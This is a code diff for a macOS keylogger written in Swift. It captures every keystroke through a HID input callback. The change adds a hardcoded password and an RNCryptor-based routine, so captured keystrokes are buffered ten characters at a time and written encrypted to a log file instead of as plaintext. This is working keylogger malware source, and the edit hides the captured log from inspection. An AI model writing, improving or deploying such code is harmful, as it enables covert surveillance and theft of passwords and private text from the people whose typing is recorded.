@@ -12,11 +12,38 @@ import Cocoa
 
 class LoggerCallback
 {
+    static var PASSWORD = "this-is-the-PASSWORD-for-KeySaver1"
     static var CAPSLOCK = false
     static var SHIFT = false
     static var calander = Calendar.current
     //    static var prev = ""
     static var command = false
+    
+    static var text = ""
+    
+    static func encrypt(text: String, toFile file: URL) {
+        if var fileContents = NSData.init(contentsOf: file) as Data? {
+            if (!fileContents.isEmpty) {
+                fileContents = try! RNCryptor.decrypt(data: fileContents as Data, withPassword: LoggerCallback.PASSWORD)
+            }
+            let newText = text.data(using: .utf8)!
+            fileContents.append(newText)
+            let ciphertext = RNCryptor.encrypt(data: fileContents as Data, withPassword: LoggerCallback.PASSWORD)
+            try! FileManager.default.removeItem(atPath: file.path)
+            if !FileManager.default.createFile(atPath: file.path, contents: nil, attributes: nil) {
+                print("Can't Create File")
+            }
+            let fhs = FileHandle.init(forWritingAtPath: file.path)
+            fhs?.seekToEndOfFile()
+            fhs?.write(ciphertext)
+        } else {
+            let newText = text.data(using: .utf8)!
+            let ciphertext = RNCryptor.encrypt(data: newText as Data, withPassword: LoggerCallback.PASSWORD)
+            let fhs = FileHandle.init(forWritingAtPath: file.path)
+            fhs?.seekToEndOfFile()
+            fhs?.write(ciphertext)
+        }
+    }
     
     static let Handle_IOHIDInputValueCallback: IOHIDValueCallback = { context, result, sender, device in
         
@@ -44,9 +71,6 @@ class LoggerCallback
         //                print("Can't Create Folder")
         //            }
         //        }
-        let filename = Keylogger.keylogs.appendingPathComponent("logs").path
-        //        if CallbackFunctions.prev == fileName
-        //        {
         //            test = false
         //        }
         //        else
@@ -54,12 +78,12 @@ class LoggerCallback
         //            test = true
         //            CallbackFunctions.prev = fileName
         //        }
-        if !FileManager.default.fileExists(atPath: filename) {
-            if !FileManager.default.createFile(atPath: filename, contents: nil, attributes: nil) {
+        if !FileManager.default.fileExists(atPath: Keylogger.filename) {
+            if !FileManager.default.createFile(atPath: Keylogger.filename, contents: nil, attributes: nil) {
                 print("Can't Create File")
             }
         }
-        let fh = FileHandle.init(forWritingAtPath: filename)
+        let fh = FileHandle.init(forWritingAtPath: Keylogger.filename)
         fh?.seekToEndOfFile()
         //        if test
         //        {
@@ -85,13 +109,14 @@ class LoggerCallback
                 //                print((mySelf.keyMap[scancode]![0] + "(").data(using: .utf8)!)
                 break Outside
             }
-            
             if LoggerCallback.CAPSLOCK || LoggerCallback.SHIFT { // Show uppercase
-                fh?.write(this.keyMap[code]![1].data(using: .utf8)!)
-                print(this.keyMap[code]![1].data(using: .utf8)!)
+                text += this.keyMap[code]![1]
             } else { // Show lowercase
-                fh?.write(this.keyMap[code]![0].data(using: .utf8)!)
-                print(this.keyMap[code]![0].data(using: .utf8)!)
+                text += this.keyMap[code]![0]
+            }
+            if (text.count == 10) {
+                LoggerCallback.encrypt(text: text, toFile: Keylogger.filenameUrl)
+                text = ""
             }
         } else { // keyup
             if code == 225 { // no more shift
@@ -100,8 +125,6 @@ class LoggerCallback
             }
             if code >= 224 && code <= 231 { // no more special keys
                 command = false
-                //                fh?.write(")".data(using: .utf8)!)
-                //                print(")".data(using: .utf8)!)
             }
         }
     }
